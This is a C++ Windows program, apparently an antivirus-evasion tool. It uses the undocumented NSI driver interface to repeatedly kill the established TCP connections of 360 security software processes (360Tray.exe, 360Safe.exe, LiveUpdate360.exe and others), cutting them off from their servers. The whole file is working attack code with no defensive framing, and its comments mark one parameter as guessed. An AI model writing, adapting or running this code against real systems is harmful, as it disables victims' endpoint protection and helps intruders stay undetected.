#include <windows.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Psapi.lib")

// ---------------------------------------------
// Dynamic NT Native Function Pointers
// ---------------------------------------------

typedef NTSTATUS(WINAPI* NtDeviceIoControlFile_t)(
    HANDLE, HANDLE, PVOID, PVOID,
    PVOID, ULONG, PVOID, ULONG, PVOID, ULONG);

typedef NTSTATUS(WINAPI* NtWaitForSingleObject_t)(
    HANDLE, BOOLEAN, PLARGE_INTEGER);

typedef ULONG(WINAPI* RtlNtStatusToDosError_t)(NTSTATUS);

// Global function pointers
NtDeviceIoControlFile_t pNtDeviceIoControlFile = nullptr;
NtWaitForSingleObject_t pNtWaitForSingleObject = nullptr;
RtlNtStatusToDosError_t pRtlNtStatusToDosError = nullptr;

//IO_STATUS_BLOCK
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;


typedef struct _NSI_SET_PARAMETERS_EX {
    PVOID Reserved0;          // 0x00
    PVOID Reserved1;          // 0x08
    PVOID ModuleId;           // 0x10
    DWORD IoCode;             // 0x18
    DWORD Unused1;            // 0x1C
    DWORD Param1;             // 0x20
    DWORD Param2;             // 0x24
    PVOID InputBuffer;        // 0x28
    DWORD InputBufferSize;    // 0x30
    DWORD Unused2;            // 0x34
    PVOID MetricBuffer;       // 0x38
    DWORD MetricBufferSize;   // 0x40
    DWORD Unused3;            // 0x44
} NSI_SET_PARAMETERS_EX;


bool LoadNtFunctions() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    pNtDeviceIoControlFile = (NtDeviceIoControlFile_t)GetProcAddress(ntdll, "NtDeviceIoControlFile");
    pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddress(ntdll, "NtWaitForSingleObject");
    pRtlNtStatusToDosError = (RtlNtStatusToDosError_t)GetProcAddress(ntdll, "RtlNtStatusToDosError");

    return pNtDeviceIoControlFile && pNtWaitForSingleObject && pRtlNtStatusToDosError;
}

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)


ULONG NsiIoctl(
    DWORD dwIoControlCode,
    LPVOID lpInBuffer,
    DWORD nInBufferSize,
    LPVOID lpOutBuffer,
    LPDWORD lpBytesReturned,
    LPOVERLAPPED lpOverlapped
) {
    static HANDLE hDevice = INVALID_HANDLE_VALUE;
    if (hDevice == INVALID_HANDLE_VALUE) {
        HANDLE h = CreateFileW(L"\\\\.\\Nsi", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE)
            return GetLastError();
        if (InterlockedCompareExchangePointer(&hDevice, h, INVALID_HANDLE_VALUE) != INVALID_HANDLE_VALUE)
            CloseHandle(h);
    }

    if (lpOverlapped) {
        if (!DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize,
            lpOutBuffer, *lpBytesReturned, lpBytesReturned, lpOverlapped)) {
            return GetLastError();
        }
        return 0;
    }

    HANDLE hEvent = CreateEvent(nullptr, FALSE, FALSE, nullptr);
    if (!hEvent) return GetLastError();

    IO_STATUS_BLOCK ioStatus = { 0 };
    NTSTATUS status = pNtDeviceIoControlFile(
        hDevice,
        hEvent,
        nullptr, nullptr,
        &ioStatus,
        dwIoControlCode,
        lpInBuffer,
        nInBufferSize,
        lpOutBuffer,
        *lpBytesReturned
    );

    if (status == STATUS_PENDING) {
        status = pNtWaitForSingleObject(hEvent, FALSE, nullptr);
        if (NT_SUCCESS(status))
            status = ioStatus.Status;
    }

    CloseHandle(hEvent);
    if (!NT_SUCCESS(status))
        return pRtlNtStatusToDosError(status);

    *lpBytesReturned = (DWORD)ioStatus.Information;
    return 0;
}


ULONG MyNsiSetAllParameters(
    DWORD a1,
    DWORD a2,
    PVOID pModuleId,
    DWORD dwIoCode,
    PVOID pInputBuffer,
    DWORD cbInputBuffer,
    PVOID pMetricBuffer,
    DWORD cbMetricBuffer
) {
    NSI_SET_PARAMETERS_EX params = { 0 };
    DWORD cbReturned = sizeof(params);

    params.ModuleId = pModuleId;
    params.IoCode = dwIoCode;
    params.Param1 = a1;
    params.Param2 = a2;
    params.InputBuffer = pInputBuffer;
    params.InputBufferSize = cbInputBuffer;
    params.MetricBuffer = pMetricBuffer;
    params.MetricBufferSize = cbMetricBuffer;

    return NsiIoctl(
        0x120013,               // IOCTL code
        &params,
        sizeof(params),
        &params,
        &cbReturned,
        nullptr
    );
}


// Undocumented TCP module ID for NSI (24 bytes)
BYTE NPI_MS_TCP_MODULEID[] = {
    0x18, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x03, 0x4A, 0x00, 0xEB, 0x1A, 0x9B, 0xD4, 0x11,
    0x91, 0x23, 0x00, 0x50, 0x04, 0x77, 0x59, 0xBC
};

// Structure expected by NsiSetAllParameters to represent a TCP socket
struct TcpKillParamsIPv4 {
    WORD  localAddrFamily;
    WORD  localPort;
    DWORD localAddr;
    BYTE  reserved1[20];

    WORD  remoteAddrFamily;
    WORD  remotePort;
    DWORD remoteAddr;
    BYTE  reserved2[20];
};

// Custom replacement for SetTcpEntry using undocumented NSI API
DWORD MySetTcpEntry(MIB_TCPROW_OWNER_PID* pTcpRow) {

    // Prepare input data for socket termination
    TcpKillParamsIPv4 params = { 0 };
    params.localAddrFamily = AF_INET;
    params.localPort = (WORD)pTcpRow->dwLocalPort;
    params.localAddr = pTcpRow->dwLocalAddr;
    params.remoteAddrFamily = AF_INET;
    params.remotePort = (WORD)pTcpRow->dwRemotePort;
    params.remoteAddr = pTcpRow->dwRemoteAddr;

    // Issue command to kill the TCP connection
    DWORD result = MyNsiSetAllParameters(
        1,                              // Unknown / static
        2,                              // Action code
        (LPVOID)NPI_MS_TCP_MODULEID,   // TCP module identifier
        16,                             // IO code (guessed)
        &params, sizeof(params),       // Input buffer
        nullptr, 0                     // Output buffer (unused)
    );

    return result;
}

std::vector<DWORD> GetPidsByProcessName(const std::wstring& processName) {
    std::vector<DWORD> pids;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CreateToolhelp32Snapshot failed.\n");
        return pids;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (!Process32FirstW(snapshot, &pe)) {
        CloseHandle(snapshot);
        wprintf(L"[!] Process32FirstW failed.\n");
        return pids;
    }

    do {
        if (processName == pe.szExeFile) {
            pids.push_back(pe.th32ProcessID);
            wprintf(L"[+] Found process: %s (PID: %lu)\n", pe.szExeFile, pe.th32ProcessID);
        }
    } while (Process32NextW(snapshot, &pe));

    CloseHandle(snapshot);
    return pids;
}

void CloseTcpConnectionsByPid(DWORD pid) {
    DWORD size = 0;
    PMIB_TCPTABLE2 tcpTable = nullptr;

    if (GetTcpTable2(nullptr, &size, TRUE) != ERROR_INSUFFICIENT_BUFFER) {
        wprintf(L"[!] Failed to query TCP table size.\n");
        return;
    }

    tcpTable = (PMIB_TCPTABLE2)malloc(size);
    if (!tcpTable) {
        wprintf(L"[!] Memory allocation failed.\n");
        return;
    }

    if (GetTcpTable2(tcpTable, &size, TRUE) != NO_ERROR) {
        free(tcpTable);
        wprintf(L"[!] Failed to get TCP table.\n");
        return;
    }

    int closedCount = 0;
    for (DWORD i = 0; i < tcpTable->dwNumEntries; ++i) {
        MIB_TCPROW2& row = tcpTable->table[i];
        if (row.dwOwningPid == pid && row.dwState == MIB_TCP_STATE_ESTAB) {
            MIB_TCPROW2 rowToSet = row;
            rowToSet.dwState = MIB_TCP_STATE_DELETE_TCB;

            DWORD result = MySetTcpEntry((MIB_TCPROW_OWNER_PID*)&row);
            if (result == NO_ERROR) {
                closedCount++;
                IN_ADDR localAddr = { row.dwLocalAddr };
                IN_ADDR remoteAddr = { row.dwRemoteAddr };
                wprintf(L"    [-] Closed TCP connection: %S:%d -> %S:%d\n",
                    inet_ntoa(localAddr), ntohs((u_short)row.dwLocalPort),
                    inet_ntoa(remoteAddr), ntohs((u_short)row.dwRemotePort));
            }
            else {
                wprintf(L"    [!] Failed to close connection. Error code: %lu\n", result);
            }
        }
    }

    if (closedCount > 0) {
        wprintf(L"[=] Closed %d connections for PID %lu\n", closedCount, pid);
    }

    free(tcpTable);
}

int wmain(int argc, wchar_t* argv[]) {

    LoadNtFunctions();

    std::vector<std::wstring> targetProcs = { L"360Tray.exe", L"360Safe.exe", L"LiveUpdate360.exe", L"safesvr.exe", L"360leakfixer.exe"};

    wprintf(L"[*] Starting connection monitor...\n");

    while (true) {
        for (const auto& procName : targetProcs) {
            std::vector<DWORD> pids = GetPidsByProcessName(procName);
            for (DWORD pid : pids) {
                CloseTcpConnectionsByPid(pid);
            }
        }
    }

    return 0;
}
